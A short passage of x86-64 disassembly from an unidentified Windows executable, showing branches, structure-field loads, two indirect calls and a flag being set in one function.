   1400052aa:	75 6e                	jne    0x14000531a
   1400052ac:	48 63 47 28          	movslq 0x28(%rdi),%rax
   1400052b0:	85 c0                	test   %eax,%eax
   1400052b2:	74 4b                	je     0x1400052ff
   1400052b4:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   1400052bb:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   1400052bf:	4c 8b c8             	mov    %rax,%r9
   1400052c2:	48 8b 05 27 db 03 00 	mov    0x3db27(%rip),%rax        # 0x140042df0
   1400052c9:	48 8b d3             	mov    %rbx,%rdx
   1400052cc:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400052d1:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400052d5:	ff 15 e5 71 02 00    	call   *0x271e5(%rip)        # 0x14002c4c0
   1400052db:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400052df:	0f 10 00             	movups (%rax),%xmm0
   1400052e2:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400052e6:	48 8b 05 ab db 03 00 	mov    0x3dbab(%rip),%rax        # 0x140042e98
   1400052ed:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400052f1:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400052f5:	ff 15 c5 71 02 00    	call   *0x271c5(%rip)        # 0x14002c4c0
   1400052fb:	85 c0                	test   %eax,%eax
   1400052fd:	75 1b                	jne    0x14000531a
   1400052ff:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140005306:	33 c0                	xor    %eax,%eax
